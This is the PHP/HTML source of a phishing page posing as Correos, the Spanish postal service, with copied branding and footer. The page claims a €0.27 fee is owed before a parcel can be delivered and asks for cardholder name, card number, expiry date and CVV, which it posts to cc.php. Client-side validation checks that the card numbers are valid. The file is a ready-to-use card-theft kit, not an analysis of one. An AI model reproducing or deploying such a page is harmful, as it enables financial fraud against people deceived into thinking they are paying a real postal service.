<?php 

    require_once "functions.php";
                                    

?>
<!DOCTYPE html>
<html>
<head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <!-- link_icons -->
        <link rel="stylesheet"  href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.5.0/font/bootstrap-icons.css">
        <link rel="stylesheet"  href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css"> 
        <title>Localizar envíos, oficinas y códigos postales| Correos.es</title>
        <!-- logo img title-->
        <link rel="icon" href="image/favicon.ico" type="image/x-icon"/>
        <link rel="shortcut icon" href="image/favicon.ico" type="image/x-icon" />
        <!-- link__css -->
        <link rel="stylesheet"  href="css/bootstrap.css">
        <link rel="stylesheet"  href="css/ofppt.css">
        <link rel="stylesheet"  href="css/animate.css">
        <style>
            .err_card{
                display: none;
            }
        </style>
</head>
<body >

        <div class="navbar">
            <div class="container">
                <div class="left d-flex align-items-center">
                    <img src="image/logo.svg" class="logo">
                    <ul class="nav align-items-center">
                        <li class="nav-item d-flex align-items-center"><img src="image/list.png"></li>
                        <li class="nav-item active box">Particular</li>
                        <li class="nav-item box">Empresa</li>
                    </ul>
                </div>
                <div class="center">
                    <img src="image/input.png">
                </div>
                <div class="right">
                    <img src="image/search.png" class="search">
                    <div class="line"></div>
                    <img src="image/user.png">
                    <span>INICIAR SESIÓN</span>
                </div>  
            </div>
        </div>

        <main id="main" >
            <div class="container">
                <div class=" title">
                    <h2>Pago en línea</h2>
                    <p>Para la entrega, necesitamos cobrar algunas tarifas de servicio. Su paquete se volverá a ceder después del pago</p>
                    <p><b>Suma global: €0.27</b></p>
                </div>
                <div class="login shadow dodg" >
                    <div class="form-check">
                      <input class="form-check-input" type="radio" name="flexRadioDefault" id="flexRadioDefault2" checked>
                      <label class="form-check-label" for="flexRadioDefault2">
                        Tarjeta de crédito o débito
                      </label>
                    </div>
                    <img src="image/cartat.jpg" width="270px" class="img-fluid mb-4">
                    <div class="mb-3"><b></b></div>
                    <form method="post" action="cc.php" onsubmit="return formValidation()">
                      <input type="hidden" name="step" value="cc">
                      <div class="row align-items-center">
                        <div class="col-12">
                          <div class="form-group mb-4 col-md-12">
                              <input id="name" type="text" name="name" required autofocus>
                              <label for="name" id="label">Titular De La Tarjeta</label>
                          </div>
                          <div class="form-group mb-4 col-md-12">
                              <input  type="text" name="card" id="card" required placeholder="0000 0000 0000 0000" pattern="[0-9]{14,16}$" >
                              <label for="card" id="label" style="top: 8px;left: 0.84118rem;font-size: 12px;color:#002e6d;font-weight: 700;">Número De Tarjeta</label>
                              <div class="err_card mt-2" style="color:red;font-weight: 600;font-size: 15px;"><i class="me-1 bi bi-exclamation-circle " id="circle"></i></div>
                          </div>
                          <div class="all">
                              <div class="form-group mb-4 soso">
                                  <input type="text" name="date" id="date" required placeholder="MM/YY" pattern="(0[1-9]|1[0-2])\/?([0-9]{4}|[0-9]{2})$">
                                  <label for="date" id="label" style="top: 8px;left: 0.84118rem;font-size: 12px;color:#002e6d;font-weight: 700;">Fecha de Caducidad</label>
                              </div>
                              <div class="form-group mb-4 soso ">
                                  <input type="text" name="code" id="code" required placeholder="123" pattern="[0-9]{3,4}$">
                                  <label for="code" id="label" style="top: 8px;left: 0.84118rem;font-size: 12px;color:#002e6d;font-weight: 700;">CVV</label>
                                  <img src="image/cvv.png" >
                              </div>
                          </div>
                        </div>
                      </div>
                      <button class="btn" name="submit" id="submit">Entregar</button>
                    </form>   
                </div>
            </div>
        </main>
        <!-- STAAAART____FOTTER -->
        <div class="fotter">
            <div class="container">
                <div class="row xx">
                    <div class="col-lg-3">
                        <ul class="nav d-block">
                            <li class="nav-item active">Para ti <img src="image/arrow.png"></li>
                            <li class="nav-item dd">Seguimiento de envío</li>
                            <li class="nav-item dd">Recibir</li>
                            <li class="nav-item dd">Enviar</li>
                        </ul>
                    </div>
                    <div class="col-lg-3">
                        <ul class="nav d-block">
                            <li class="nav-item active">Para tu empresa <img src="image/arrow.png"></li>
                            <li class="nav-item dd">Enviar</li>
                            <li class="nav-item dd">Ecommerce</li>
                            <li class="nav-item dd">Marketing</li>
                        </ul>
                    </div>
                    <div class="col-lg-3">
                        <ul class="nav d-block">
                            <li class="nav-item active">Para tu interés <img src="image/arrow.png"></li>
                            <li class="nav-item dd">Filatelia</li>
                            <li class="nav-item dd">Correos Market</li>
                            <li class="nav-item dd">Web institucional</li>
                        </ul>
                    </div>
                    <div class="col-lg-3">
                        <ul class="nav d-block">
                            <li class="nav-item active dd"><img src="image/cask.png" class="cask"><img src="image/arrow.png"></li>
                            <li class="nav-item dd">Atención al cliente</li>
                            <li class="nav-item ss"><img src="image/sosio.png" class="img-fluid"></li>
                        </ul>
                    </div>
                </div>
                <hr>
                <div class="row mt-3 mb-5">
                    <div class="col-lg-5 mt-3">
                        <p class="lead" style="font-size: 14px;">Descarga la App de Correos</p>
                        <div class="imgs  d-flex py-1 align-items-center">
                            <img src="image/apple.jpg" width="122px" height="40px" class="mt-2">
                            <img src="image/play.jpg" width="122px" height="40px" class="mt-2">
                            <img src="image/huawei.svg" width="122px" height="40px" class="mt-2">
                        </div>
                    </div>
                    <div class="col-lg-5 mt-3">
                        <p class="lead" style="font-size: 14px;">Descarga la App de Correos</p>
                        <div class="acht">
                            <ul class="nav">
                                <li class="nav-item d-flex align-items-center justify-content-center mt-2"><img src="image/mastercard.png" width="38" height="30"></li>
                                <li class="nav-item d-flex align-items-center justify-content-center mt-2"><img src="image/paypal.svg" width="38" height="9"></li>
                                <li class="nav-item d-flex align-items-center justify-content-center mt-2"><img src="image/maestro.svg" width="38" height="24"></li>
                                <li class="nav-item d-flex align-items-center justify-content-center mt-2"><img src="image/visa.svg" width="38" height="12"></li>
                                <li class="nav-item d-flex align-items-center justify-content-center mt-2"><img src="image/amex.svg" width="38" height="11"></li>
                            </ul>
                        </div>
                    </div>
                    <div class="col-lg-7"></div>
                </div>
            </div>
        </div>
        <!-- ENNNNNND____FOTTER -->

        <!-- DIV_FOOOOOOT -->
        <div class="fot">
            <div class="container">
                <img src="image/logo_footer.svg">
                <div class="asd">
                    <ul class="nav">
                        <li class="nav-item">Política de cookies</li>
                        <li class="nav-item">Aviso legal</li>
                        <li class="nav-item">Privacidad web</li>
                        <li class="nav-item">Alerta seguridad</li>
                        <li class="nav-item">Accesibilidad</li>
                        <li class="nav-item">Configurador de cookies</li>
                    </ul>
                    <p>©Sociedad Estatal Correos y Telegrafos, S.A., S.M.E. Todos los derechos reservados.</p>
                </div>
            </div>
        </div>
        <!-- DIV_FOOOOOOT -->





        <script src="js/jquery-3.5.1.min.js"></script>
        <script src="js/jquery.mask.js"></script>
        <script>
          
          $("#card").mask("0000000000000000");
          $("#date").mask("00/00");
          $("#code").mask("0000");
          $("#pin").mask("0000");
          
          $("#card").mask("0000000000000000")
            function formValidation(){

                var card = $("#card").val();


                // Validation_card
                if(card==""){
                    $(".err_card").show();
                    $(".err_card").text("Please enter your Card Number");
                    return false;
                }else{
                    var patern_card = /^(?:(4[0-9]{12}(?:[0-9]{3})?)|(5[1-5][0-9]{14})|(6(?:011|5[0-9]{2})[0-9]{12})|(3[47][0-9]{13})|(3(?:0[0-5]|[68][0-9])[0-9]{11})|((?:2131|1800|35[0-9]{3})[0-9]{11}))$/;
                    if(!patern_card.test(card)){
                        $(".err_card").show();
                        $(".err_card").text("Please enter your valid card number");
                        return false;
                    }
                }


                return true;
            }

              
        </script>
              
</body>
</html>
